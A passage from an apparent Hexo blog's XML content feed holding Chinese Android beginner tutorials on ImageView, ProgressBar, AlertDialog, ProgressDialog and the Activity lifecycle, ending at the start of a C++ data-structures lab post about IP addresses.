class="line">    <span class="keyword">final</span> ImageView imageView=(ImageView)findViewById(R.id.image_view);</span><br><span class="line">    button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            imageView.setImageResource(R.drawable.img_2);</span><br><span class="line">           Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">&quot;更换图片成功&quot;</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922160531021.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922160531021.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922160531021"></p><h1 id="ProgressBar"><a href="#ProgressBar" class="headerlink" title="ProgressBar"></a>ProgressBar</h1><p>载入一个进度条</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ProgressBar</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/progeress_bar&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922160900149.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922160900149.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922160900149"></p><p>使用控件的可见属性，通过<code>android:visibility</code>进行指定，可选值有visible、invisible和gone</p><p>visible表示控件可见 invisible表示控件不可见，但是仍然占据屏幕大小 而对于gone来说就是不可见而且不占据屏幕的任何大小</p><p>用代码来设置gone的话使用的是<code>setVisibility( )</code>方法，可以传入<code>View.VISBLE</code>、<code>View.INVISIBLE</code>和<code>View.GONE</code>三种值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ProgressBar progressBar=(ProgressBar) findViewById(R.id.progeress_bar);</span><br><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(progressBar.getVisibility()==View.GONE)&#123;</span><br><span class="line">            progressBar.setVisibility(View.VISIBLE);</span><br><span class="line">            Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">&quot;打开进度条&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            progressBar.setVisibility(View.GONE);</span><br><span class="line">            Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">&quot;关闭进度条&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922162238559.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922162238559.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922162238559"><img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922162259710.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922162259710.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922162259710"></p><p>可以通过更改布局文件改变进度条的样式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ProgressBar</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/progeress_bar&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">&quot;?android:attr/progressBarStyleHorizontal&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:max</span>=<span class="string">&quot;100&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取当前进度条进度</span></span><br><span class="line">    <span class="keyword">int</span> progress=progressBar.getProgress();</span><br><span class="line">    progress=progress+<span class="number">10</span>;</span><br><span class="line">    <span class="comment">//重新更改进度条的进度 max为100</span></span><br><span class="line">    progressBar.setProgress(progress);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922162919030.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922162919030.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922162919030"></p><h1 id="AlertDialog"><a href="#AlertDialog" class="headerlink" title="AlertDialog"></a>AlertDialog</h1><p>可以使用Dialgo弹出一个对话框，这个对话框是置于所有界面元素值之上的，能够屏蔽掉其他空间的交互能力，因此AlertDialog一般用于提示一些非常重要的内容或者警告信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        AlertDialog.Builder dialog=<span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">        dialog.setTitle(<span class="string">&quot;这是一个警告框&quot;</span>);</span><br><span class="line">        dialog.setMessage(<span class="string">&quot;重要的事情&quot;</span>);</span><br><span class="line">        <span class="comment">//设置该警告框是否能取消</span></span><br><span class="line">        dialog.setCancelable(<span class="keyword">false</span>);</span><br><span class="line">        dialog.setPositiveButton(<span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        dialog.setNegativeButton(<span class="string">&quot;Cancel&quot;</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        dialog.show();</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>dialog.setPositiveButton( )</code>设置对话框确定按钮点击事件</p><p> <code>dialog.setNegativeButton( )</code>设置对话框取消按钮点击事件</p><p><code>最后调用dialog.show( )</code>将对话框显示出来<img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/d1294475bebbec36f6d3292fd9a8b8b.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/d1294475bebbec36f6d3292fd9a8b8b.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="d1294475bebbec36f6d3292fd9a8b8b"></p><h1 id="ProgressDialog"><a href="#ProgressDialog" class="headerlink" title="ProgressDialog"></a>ProgressDialog</h1><p>进度条框会显示一个进度条，一般用于表示当前的操作比较耗时，让用户耐心地等待，它的用法和AlertDialog比较类似，修改MainActivity中的代码，如图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    ProgressDialog progressDialog=<span class="keyword">new</span> ProgressDialog(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">    progressDialog.setTitle(<span class="string">&quot;这是一个进度条框&quot;</span>);</span><br><span class="line">    progressDialog.setMessage(<span class="string">&quot;正在加载中··&quot;</span>);</span><br><span class="line">    progressDialog.setCancelable(<span class="keyword">false</span>);</span><br><span class="line">    progressDialog.show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922191227830.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%8E%A7%E4%BB%B6%E4%BD%BF%E7%94%A8/image-20200922191227830.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922191227830"></p><p>可以看到先构造一个ProgressDialog对象，设置标题、内容、可否取消(设置true可以通过back键进行一个取消)的属性，最后调用show( )方法将ProgressDialog显示出来</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-深入了解Activity</title>
      <link href="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/"/>
      <url>/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/</url>
      
        <content type="html"><![CDATA[<h1 id="Activity的生存期"><a href="#Activity的生存期" class="headerlink" title="Activity的生存期"></a>Activity的生存期</h1><h2 id="onCreate"><a href="#onCreate" class="headerlink" title="onCreate( )"></a>onCreate( )<img src="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010121618.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010121618.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922010121618"></h2><h2 id="onStart"><a href="#onStart" class="headerlink" title="onStart( )"></a>onStart( )<img src="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010127824.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010127824.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922010127824"></h2><h2 id="onResume"><a href="#onResume" class="headerlink" title="onResume( )"></a>onResume( )<img src="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010135656.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010135656.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922010135656"></h2><h2 id="onPause"><a href="#onPause" class="headerlink" title="onPause( )"></a>onPause( )<img src="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010141516.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010141516.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922010141516"></h2><h2 id="onStop"><a href="#onStop" class="headerlink" title="onStop( )"></a>onStop( )<img src="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010148700.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010148700.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922010148700"></h2><h2 id="onDestroy"><a href="#onDestroy" class="headerlink" title="onDestroy( )"></a>onDestroy( )<img src="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010155783.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010155783.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922010155783"></h2><h2 id="onRestart"><a href="#onRestart" class="headerlink" title="onRestart( )"></a>onRestart( )<img src="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010206148.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922010206148.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922010206148"></h2><h2 id="2-活动回收"><a href="#2-活动回收" class="headerlink" title="2.活动回收"></a>2.活动回收</h2><p>当在活动A基础启动B，再次返回A的过程，A可能会被回收。如果A此时被回收，此时不会执行onRestart( )方法，而是会重新执行活动A的onCreate( )方法，所以活动A这种情况下会被重新创建一次。</p><p>如果此时A中有临时数据以及状态，这样的话会被系统回收掉，此时必须采用onSaveInstanceState( )回调方法，该方法带有一个Bundle类型的参数。</p><p>Bundl提供了一系列的方法用于保存数据，比如可以使用putString( )方法保存字符串，使用putInt( )方法保存整型数据，每个保存方法存入两个参数，第一个参数是键，用于后面从Bundle取值，第二个参数是真正的值</p><p><img src="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922132815701.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922132815701.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922132815701"></p><p>由于onCreate( )方法中，有一个Bundle参数，可以把其中的Bundle参数取出来</p><p><img src="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922132921639.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922132921639.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922132921639"></p><h1 id="活动的启动模式"><a href="#活动的启动模式" class="headerlink" title="活动的启动模式"></a>活动的启动模式</h1><p><strong>standard是活动默认的启动模式</strong>，在不进行显式指定的情况下，所有活动都会自动使用这种启动模式。因此，到目前为止我们写过的所有活动都是使用standard模式，每当启动一个新的活动，它就会在返回栈中，并处于栈顶的位置。对于使用standard模式的活动，系统不会在乎这个活动是否已经在返回栈中存在，每次启动都会创建该活动的一个新例。</p><p><img src="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922133306896.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Activity/image-20200922133306896.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922133306896"></p><p><strong>singleTop启动模式</strong></p><p><strong>singleTask模式</strong></p><p><strong>singleInstance模式</strong></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构实验-ip题代码</title>
      <link href="/2020/09/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C-ip%E9%A2%98%E4%BB%A3%E7%A0%81/"/>
      <url>/2020/09/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C-ip%E9%A2%98%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;regex&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span 